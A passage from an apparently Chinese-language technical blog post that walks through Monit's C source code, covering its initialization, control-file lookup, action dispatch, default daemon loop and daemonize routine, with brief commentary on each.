read current directory -- %s"</span>, STRERROR);</span><br><span class="line">        Run.Env.cwd = Str_dup(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handle_options函数处理传参情况：</p><p>do_init函数初始化文件和服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize this application - Register signal handlers,</span></span><br><span class="line"><span class="comment"> * Parse the control file and initialize the program's</span></span><br><span class="line"><span class="comment"> * datastructures and the log system.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Register interest for the SIGTERM signal,</span></span><br><span class="line"><span class="comment">         * in case we run in daemon mode this signal</span></span><br><span class="line"><span class="comment">         * will terminate a running daemon.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        signal(SIGTERM, do_destroy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Register interest for the SIGUSER1 signal,</span></span><br><span class="line"><span class="comment">         * in case we run in daemon mode this signal</span></span><br><span class="line"><span class="comment">         * will wakeup a sleeping daemon.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        signal(SIGUSR1, do_wakeup);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Register interest for the SIGINT signal,</span></span><br><span class="line"><span class="comment">         * in case we run as a server but not as a daemon</span></span><br><span class="line"><span class="comment">         * we need to catch this signal if the user pressed</span></span><br><span class="line"><span class="comment">         * CTRL^C in the terminal</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        signal(SIGINT, do_destroy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Register interest for the SIGHUP signal,</span></span><br><span class="line"><span class="comment">         * in case we run in daemon mode this signal</span></span><br><span class="line"><span class="comment">         * will reload the configuration.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        signal(SIGHUP, do_reload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Register no interest for the SIGPIPE signal,</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        signal(SIGPIPE, SIG_IGN);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize the random number generator</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        srandom((<span class="keyword">unsigned</span>)(Time_now() + getpid()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize the Runtime mutex. This mutex</span></span><br><span class="line"><span class="comment">         * is used to synchronize handling of global</span></span><br><span class="line"><span class="comment">         * service data</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Mutex_init(Run.mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize heartbeat mutex and condition</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Mutex_init(heartbeatMutex);</span><br><span class="line">        Sem_init(heartbeatCond);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Get the position of the control file</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (! Run.files.control)</span><br><span class="line">                Run.files.control = file_findControlFile();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize the system information data collecting interface</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (init_system_info())</span><br><span class="line">                Run.flags |= Run_ProcessEngineEnabled;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Start the Parser and create the service list. This will also set</span></span><br><span class="line"><span class="comment">         * any Runtime constants defined in the controlfile.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (! parse(Run.files.control))</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize the log system</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (! log_init())</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Did we find any service ?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (! servicelist) &#123;</span><br><span class="line">                LogError(<span class="string">"No service has been specified\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Initialize Runtime file variables</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        file_init();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Should we print debug information ?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Run.debug) &#123;</span><br><span class="line">                Util_printRunList();</span><br><span class="line">                Util_printServiceList();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Reap any stray child processes we may have created</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        atexit(waitforchildren);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file_findControlFile()函数，读取配置文件，corefoundation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">file_findControlFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *rcfile = CALLOC(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), STRLEN + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">snprintf</span>(rcfile, STRLEN, <span class="string">"%s/.%s"</span>, Run.Env.<span class="built_in">home</span>, MONITRC);</span><br><span class="line">        <span class="keyword">if</span> (File_exist(rcfile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rcfile;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(rcfile, STRLEN, <span class="string">"/etc/%s"</span>, MONITRC);</span><br><span class="line">        <span class="keyword">if</span> (File_exist(rcfile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rcfile;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(rcfile, STRLEN, <span class="string">"%s/%s"</span>, SYSCONFDIR, MONITRC);</span><br><span class="line">        <span class="keyword">if</span> (File_exist(rcfile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rcfile;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(rcfile, STRLEN, <span class="string">"/usr/local/etc/%s"</span>, MONITRC);</span><br><span class="line">        <span class="keyword">if</span> (File_exist(rcfile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rcfile;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (File_exist(MONITRC)) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(rcfile, STRLEN, <span class="string">"%s/%s"</span>, Run.Env.cwd, MONITRC);</span><br><span class="line">                <span class="keyword">return</span> rcfile;</span><br><span class="line">        &#125;</span><br><span class="line">        LogError(<span class="string">"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \n"</span>, MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_action主流程:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Dispatch to the submitted action - actions are program arguments</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_action</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *action = args[optind];</span><br><span class="line"></span><br><span class="line">        Run.flags |= Run_Once;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! action) &#123;</span><br><span class="line">                do_default();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"start"</span>)     ||</span><br><span class="line">                   IS(action, <span class="string">"stop"</span>)      ||</span><br><span class="line">                   IS(action, <span class="string">"monitor"</span>)   ||</span><br><span class="line">                   IS(action, <span class="string">"unmonitor"</span>) ||</span><br><span class="line">                   IS(action, <span class="string">"restart"</span>)) &#123;</span><br><span class="line">                <span class="keyword">char</span> *service = args[++optind];</span><br><span class="line">                <span class="keyword">if</span> (Run.mygroup || service) &#123;</span><br><span class="line">                        <span class="keyword">int</span> errors = <span class="number">0</span>;</span><br><span class="line">                        List_T services = List_new();</span><br><span class="line">                        <span class="keyword">if</span> (Run.mygroup) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (ServiceGroup_T sg = servicegrouplist; sg; sg = sg-&gt;next) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (IS(Run.mygroup, sg-&gt;name)) &#123;</span><br><span class="line">                                                <span class="keyword">for</span> (<span class="keyword">list_t</span> m = sg-&gt;members-&gt;head; m; m = m-&gt;next) &#123;</span><br><span class="line">                                                        Service_T s = m-&gt;e;</span><br><span class="line">                                                        List_append(services, s-&gt;name);</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (List_length(services) == <span class="number">0</span>) &#123;</span><br><span class="line">                                        List_free(&amp;services);</span><br><span class="line">                                        LogError(<span class="string">"Group '%s' not found\n"</span>, Run.mygroup);</span><br><span class="line">                                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(service, <span class="string">"all"</span>)) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (Service_T s = servicelist; s; s = s-&gt;next)</span><br><span class="line">                                        List_append(services, s-&gt;name);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                List_append(services, service);</span><br><span class="line">                        &#125;</span><br><span class="line">                        errors = exist_daemon() ? (HttpClient_action(action, services) ? <span class="number">0</span> : <span class="number">1</span>) : control_service_string(services, action);</span><br><span class="line">                        List_free(&amp;services);</span><br><span class="line">                        <span class="keyword">if</span> (errors)</span><br><span class="line">                                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        LogError(<span class="string">"Please specify a service name or 'all' after %s\n"</span>, action);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"reload"</span>)) &#123;</span><br><span class="line">                LogInfo(<span class="string">"Reinitializing %s daemon\n"</span>, prog);</span><br><span class="line">                kill_daemon(SIGHUP);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"status"</span>)) &#123;</span><br><span class="line">                <span class="keyword">char</span> *service = args[++optind];</span><br><span class="line">                <span class="keyword">if</span> (! HttpClient_status(Run.mygroup, service))</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"summary"</span>)) &#123;</span><br><span class="line">                <span class="keyword">char</span> *service = args[++optind];</span><br><span class="line">                <span class="keyword">if</span> (! HttpClient_summary(Run.mygroup, service))</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"report"</span>)) &#123;</span><br><span class="line">                <span class="keyword">char</span> *type = args[++optind];</span><br><span class="line">                <span class="keyword">if</span> (! HttpClient_report(type))</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"procmatch"</span>)) &#123;</span><br><span class="line">                <span class="keyword">char</span> *pattern = args[++optind];</span><br><span class="line">                <span class="keyword">if</span> (! pattern) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Invalid syntax - usage: procmatch \"&lt;pattern&gt;\"\n"</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ProcessTree_testMatch(pattern);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"quit"</span>)) &#123;</span><br><span class="line">                kill_daemon(SIGTERM);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS(action, <span class="string">"validate"</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (do_wakeupcall()) &#123;</span><br><span class="line">                        <span class="keyword">char</span> *service = args[++optind];</span><br><span class="line">                        HttpClient_status(Run.mygroup, service);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        _validateOnce();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LogError(<span class="string">"Invalid argument -- %s  (-h will show valid arguments)\n"</span>, action);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>action= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。</p><p>do_default主要启动服务的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Default action - become a daemon if defined in the Run object and</span></span><br><span class="line"><span class="comment"> * run validate() between sleeps. If not, just run validate() once.</span></span><br><span class="line"><span class="comment"> * Also, if specified, start the monit http server if in deamon mode.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_default</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Run.flags &amp; Run_Daemon) &#123;</span><br><span class="line">                <span class="keyword">if</span> (do_wakeupcall())</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                Run.flags &amp;= ~Run_Once;</span><br><span class="line">                <span class="keyword">if</span> (can_http()) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (Run.httpd.flags &amp; Httpd_Net)</span><br><span class="line">                                LogInfo(<span class="string">"Starting Monit %s daemon with http interface at [%s]:%d\n"</span>, VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : <span class="string">"*"</span>, Run.httpd.socket.net.port);</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (Run.httpd.flags &amp; Httpd_Unix)</span><br><span class="line">                                LogInfo(<span class="string">"Starting Monit %s daemon with http interface at %s\n"</span>, VERSION, Run.httpd.socket.unix.path);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        LogInfo(<span class="string">"Starting Monit %s daemon\n"</span>, VERSION);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (! (Run.flags &amp; Run_Foreground))</span><br><span class="line">                        daemonize();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (! file_createPidFile(Run.files.pid)) &#123;</span><br><span class="line">                        LogError(<span class="string">"Monit daemon died\n"</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (! State_open())</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                State_restore();</span><br><span class="line"></span><br><span class="line">                atexit(file_finalize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Run.startdelay &amp;&amp; State_reboot()) &#123;</span><br><span class="line">                        <span class="keyword">time_t</span> now = Time_now();</span><br><span class="line">                        <span class="keyword">time_t</span> <span class="built_in">delay</span> = now + Run.startdelay;</span><br><span class="line"></span><br><span class="line">                        LogInfo(<span class="string">"Monit will delay for %ds on first start after reboot ...\n"</span>, Run.startdelay);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* sleep can be interrupted by signal =&gt; make sure we paused long enough */</span></span><br><span class="line">                        <span class="keyword">while</span> (now &lt; <span class="built_in">delay</span>) &#123;</span><br><span class="line">                                sleep((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="built_in">delay</span> - now));</span><br><span class="line">                                <span class="keyword">if</span> (Run.flags &amp; Run_Stopped)</span><br><span class="line">                                        do_exit(<span class="literal">false</span>);</span><br><span class="line">                                now = Time_now();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (can_http())</span><br><span class="line">                        monit_http(Httpd_Start);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* send the monit startup notification */</span></span><br><span class="line">                Event_post(Run.system, Event_Instance, State_Changed, Run.system-&gt;action_MONIT_START, <span class="string">"Monit %s started"</span>, VERSION);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Run.mmonits) &#123;</span><br><span class="line">                        Thread_create(heartbeatThread, heartbeat, <span class="literal">NULL</span>);</span><br><span class="line">                        heartbeatRunning = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        validate();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* In the case that there is no pending action then sleep */</span></span><br><span class="line">                        <span class="keyword">if</span> (! (Run.flags &amp; Run_ActionPending) &amp;&amp; ! interrupt())</span><br><span class="line">                                sleep(Run.polltime);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (Run.flags &amp; Run_DoWakeup) &#123;</span><br><span class="line">                                Run.flags &amp;= ~Run_DoWakeup;</span><br><span class="line">                                LogInfo(<span class="string">"Awakened by User defined signal 1\n"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (Run.flags &amp; Run_Stopped) &#123;</span><br><span class="line">                                do_exit(<span class="literal">true</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Run.flags &amp; Run_DoReload) &#123;</span><br><span class="line">                                do_reinit();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                State_saveIfDirty();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                _validateOnce();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_wakeupcall调用函数是否需要唤醒进程。</p><p>can_http()判断是否可以启动http.</p><p>daemonize()函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transform a program into a daemon. Inspired by code from Stephen</span></span><br><span class="line"><span class="comment"> * A. Rago's book, Unix System V Network Programming.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">daemonize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pid_t</span> pid;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Become a session leader to lose our controlling terminal</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork ()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                LogError(<span class="string">"Cannot fork a new process\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">                _exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        setsid();</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork ()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                LogError(<span class="string">"Cannot fork a new process\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">                _exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Change current directory to the root so that other file systems can be unmounted while we're running</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (chdir(<span class="string">"/"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                LogError(<span class="string">"Cannot chdir to / -- %s\n"</span>, STRERROR);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Util_redirectStdFds();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file_createPidFile场景pid文件。</p><p>服务数据结构，所有的服务数据结构都在monit.h文件中</p><p>yacc 